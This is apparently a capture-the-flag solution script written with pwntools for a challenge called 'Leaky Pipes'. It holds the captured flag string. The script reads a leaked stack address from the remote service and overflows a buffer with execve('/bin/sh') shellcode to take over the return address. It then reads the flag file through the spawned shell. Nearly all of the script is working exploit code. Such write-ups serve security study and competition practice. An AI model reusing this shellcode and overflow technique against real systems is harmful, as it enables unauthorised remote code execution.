#Exploit for Leaky Pipes
#flag = 0xl4ugh{waaaah_yaboooooy_kol_daaa_shellcode}
from pwn import *

exe = ELF("./leaky_pipe")

context.binary = exe

shellcode = "\x90"*0x10 + "\x48\x89\xE7\x31\xC0\x99\xB0\x3B\x48\x31\xF6\x0F\x05"
'''
0:  48 89 e7                mov    rdi,rsp
3:  31 c0                   xor    eax,eax
5:  99                      cdq
6:  b0 3b                   mov    al,0x3b
8:  48 31 f6                xor    rsi,rsi
b:  0f 05                   syscall
'''

def conn():
    if args.LOCAL:
        return process([exe.path])
    else:
        return remote('ctf.0xl4ugh.com', 4141)


def main():
    r = conn()
    r.recvuntil("0x")
    addr = int(r.recvline().strip(), 0x10)
    r.send(shellcode.ljust(0x28, "\x00") + p64(addr) + "/bin/sh\x00")
    r.sendline("cat fla*")
    print(r.recvline())

if __name__ == "__main__":
    main()
